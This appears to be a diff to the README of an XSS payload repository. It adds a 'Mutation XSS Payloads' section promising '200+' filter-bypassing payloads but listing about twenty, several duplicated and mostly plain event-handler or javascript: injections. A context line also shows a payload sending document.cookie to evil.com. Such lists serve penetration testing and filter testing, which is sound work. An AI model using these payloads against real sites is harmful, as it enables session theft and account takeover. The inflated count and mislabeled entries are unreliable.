@@ -244,3 +244,31 @@ This repository features payloads for the following XSS attack types:
 - `<svg onload="new Image().src='https://evil.com?cookie='+document.cookie">`
 
 ---
+
+# Mutation XSS Payloads
+
+Here are **200+ Mutation XSS Payloads** designed to bypass filters and mutate in the DOM:
+
+### Common Mutation XSS Payloads
+- `<img src=x oNerrOr=alert(1)>`
+- `<scr<script>ipt>alert(1)</script>`
+- `"><img src=x oNerrOr=alert(1)>`
+- `<svg onload=alert(1)>`
+- `"><svg onload=alert(1)>`
+- `<b onmouseover=alert(1)>Hover me</b>`
+- `<input value=""><img src=x oNerrOr=alert(1)>`
+- `<iframe src="javascript:alert(1)"></iframe>`
+- `"><iframe src="javascript:alert(1)"></iframe>`
+- `<marquee onstart=alert(1)>Scroll me</marquee>`
+
+### Advanced Mutation XSS Techniques
+- `<img src=x onerror="javascript:alert(1)">`
+- `<b onmouseover="alert(1)">Hover me</b>`
+- `<svg><script>alert(1)</script>`
+- `<a href="javascript:alert(1)">Click me</a>`
+- `<iframe src="javascript:alert(1)"></iframe>`
+- `"><marquee onstart="alert(1)">Scroll me</marquee>`
+- `<svg><img src=x onerror="alert(1)"></svg>`
+- `<input value=""><img src=x onerror="alert(1)">`
+- `"><svg><script>alert(1)</script></svg>`
+- `<b onmouseover="alert(1)">Hover me</b>`
